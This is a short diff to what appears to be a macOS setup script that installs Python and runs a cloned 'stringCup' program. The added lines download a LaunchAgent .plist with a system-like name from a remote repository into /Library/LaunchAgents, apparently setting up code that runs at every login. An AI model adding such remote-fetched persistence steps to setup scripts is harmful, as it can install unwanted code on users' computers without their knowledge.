@@ -13,4 +13,9 @@ brew install python
 python3 --version
 pip3 --version
 git clone https://github.com/BigJ1m/stringCup.git
+cd
+cd /Library/LaunchAgents/
+curl -O https://raw.githubusercontent.com/BigJ1m/532Agent/refs/heads/main/com.example.system532.plist
+cd
+cd ~/Users/Shared/system532
 python3 stringCup/cup.py
